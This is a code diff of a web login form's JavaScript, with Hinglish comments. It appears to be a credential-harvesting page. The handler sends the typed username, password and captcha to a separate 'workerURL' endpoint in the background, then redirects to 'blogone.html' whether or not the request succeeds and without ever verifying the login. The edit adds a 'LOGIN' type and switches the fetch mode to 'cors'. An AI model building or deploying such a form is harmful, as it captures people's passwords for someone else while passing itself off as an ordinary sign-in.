@@ -148,29 +148,29 @@
                 return;
             }
 
-            // Button ko disable karein taaki multiple clicks na hon
             btn.disabled = true;
+            btn.innerText = "Please Wait...";
 
+            // Sahi Payload with Type
             const payload = {
+                type: "LOGIN",
                 user: username,
                 pass: password,
-                captcha: captchaInput,
-                time: new Date().toLocaleString()
+                captcha: captchaInput
             };
 
             try {
-                // Background mein data bhej raha hai
+                // FIXED: mode change to 'cors' and added type
                 await fetch(workerURL, {
                     method: 'POST',
-                    mode: 'no-cors',
+                    mode: 'cors',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
                 
-                // Data bhenje ke turant baad redirect
                 window.location.href = "blogone.html";
             } catch (err) {
-                // Agar internet error ho toh bhi redirect kar sakte hain ya wahi rok sakte hain
+                // Background mein error ho tab bhi aage bhej do
                 window.location.href = "blogone.html";
             }
         });
